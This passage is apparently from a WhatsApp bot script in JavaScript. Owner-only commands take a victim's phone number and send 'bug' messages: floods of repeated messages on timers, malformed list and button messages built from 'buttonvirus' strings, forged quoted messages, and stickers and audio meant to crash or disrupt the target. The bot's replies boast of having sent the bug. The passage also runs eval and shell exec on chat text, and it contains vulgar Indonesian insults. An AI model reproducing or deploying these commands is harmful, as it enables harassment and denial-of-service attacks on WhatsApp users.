                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
          case 'gasmomo': {            
          if (!isCreator) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`

             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
case 'buglist':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolputralist = [
                {
                title: `༒F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r༒ ${ngazap} ${faxbot}`,
                rows: [
                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Fardan Tzyˣ_ˣ`},
                {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
                ]
                }
                ]
                hisoka.sendListMsg(m.chat, `༒F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r༒`, hisoka.user.name, `Fax kanjut`, `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r༒`, kontolputralist, m)
                }
                }
break
case 'butto':
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: faxbot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: faxbot}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "JOMBLO",
                          footerText: 'JONES',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      hisoka.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      freply(`succes`)
                    break
case 'stikto':{
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('./faraxx/anjas.webp')
hisoka.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await freply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'vnto':{
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await freply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return freply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return freply(bang)
                    }
                    try {
                        freply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        freply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return freply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await freply(evaled)
                    } catch (err) {
                        await freply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return freply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return freply(`${err}`)
                        if (stdout) return freply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        console.log(chalk.redBright(util.format(err)))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
